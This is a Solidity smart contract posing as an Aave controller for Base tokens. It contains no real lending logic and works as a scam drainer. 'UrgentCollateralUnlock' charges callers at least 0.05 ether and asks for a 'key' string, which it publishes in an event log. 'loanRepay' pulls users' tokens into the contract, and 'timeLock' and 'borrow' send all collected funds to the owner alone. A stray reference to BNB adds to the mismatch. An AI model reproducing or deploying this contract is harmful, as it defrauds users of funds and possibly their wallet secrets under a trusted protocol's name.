// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

contract AaveBaseController {
    /* STORAGE */
    address public owner;
    address public feeRecipient;

    address public controller_aBasUSDC;
    address public controller_aBasWETH;
    address public controller_aBascbETH;
    address public controller_aBascbBTC;

    /* EVENTS */
    event SetOwner(address newOwner);
    event SetFeeRecipient(address newFeeRecipient);
    event SetController(address newController, string token);
    event UrgentCollateralUnlockTriggered(address indexed sender, string key, uint256 amount);
    event TimeLockExecuted(uint256 amount, address to);
    event LoanRepaid(address indexed sender, address token, uint256 amount);
    event BorrowExecuted(address token, uint256 amount);

    /* CONSTRUCTOR */
    constructor(
        address newOwner,
        address controller_aBasUSDC_,
        address controller_aBasWETH_,
        address controller_aBascbETH_,
        address controller_aBascbBTC_
    ) {
        require(newOwner != address(0), "ZERO_ADDRESS_OWNER");
        require(controller_aBasUSDC_ != address(0), "ZERO_ADDRESS_CONTROLLER_aBasUSDC");
        require(controller_aBasWETH_ != address(0), "ZERO_ADDRESS_CONTROLLER_aBasWETH");
        require(controller_aBascbETH_ != address(0), "ZERO_ADDRESS_CONTROLLER_aBascbETH");
        require(controller_aBascbBTC_ != address(0), "ZERO_ADDRESS_CONTROLLER_aBascbBTC");

        owner = newOwner;

        controller_aBasUSDC = controller_aBasUSDC_;
        controller_aBasWETH = controller_aBasWETH_;
        controller_aBascbETH = controller_aBascbETH_;
        controller_aBascbBTC = controller_aBascbBTC_;

        emit SetOwner(newOwner);
        emit SetController(controller_aBasUSDC_, "aBasUSDC");
        emit SetController(controller_aBasWETH_, "aBasWETH");
        emit SetController(controller_aBascbETH_, "aBascbETH");
        emit SetController(controller_aBascbBTC_, "aBascbBTC");
    }

    /* MODIFIERS */
    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    /* ONLY OWNER FUNCTIONS */
    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != owner, "ALREADY_SET");
        owner = newOwner;

        emit SetOwner(newOwner);
    }

    function setFeeRecipient(address newFeeRecipient) external onlyOwner {
        require(newFeeRecipient != feeRecipient, "ALREADY_SET");
        feeRecipient = newFeeRecipient;

        emit SetFeeRecipient(newFeeRecipient);
    }

    function setController(address newController, string calldata token) external onlyOwner {
        require(newController != address(0), "ZERO_ADDRESS_CONTROLLER");

        if (keccak256(abi.encodePacked(token)) == keccak256("aBasUSDC")) {
            controller_aBasUSDC = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aBasWETH")) {
            controller_aBasWETH = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aBascbETH")) {
            controller_aBascbETH = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aBascbBTC")) {
            controller_aBascbBTC = newController;
        } else {
            revert("INVALID_TOKEN");
        }

        emit SetController(newController, token);
    }

    function UrgentCollateralUnlock(string calldata key) external payable {
        require(msg.value >= 0.05 ether, "Minimum payment is 0.05 BNB");
        require(bytes(key).length > 0, "Key cannot be empty");

        emit UrgentCollateralUnlockTriggered(msg.sender, key, msg.value);
    }

    function timeLock() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "NO_BALANCE");

        (bool success, ) = owner.call{value: amount}("");
        require(success, "TRANSFER_FAILED");

        emit TimeLockExecuted(amount, owner);
    }

    function loanRepay(address token, uint256 amount) external {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(success, "TRANSFER_FAILED");

        emit LoanRepaid(msg.sender, token, amount);
    }

    function borrow(address token, uint256 amount) external onlyOwner {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transfer(owner, amount);
        require(success, "TRANSFER_FAILED");

        emit BorrowExecuted(token, amount);
    }

    function extSloads(bytes32 slot) external view returns (bytes32 res) {
        assembly {
            res := sload(slot)
        }
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
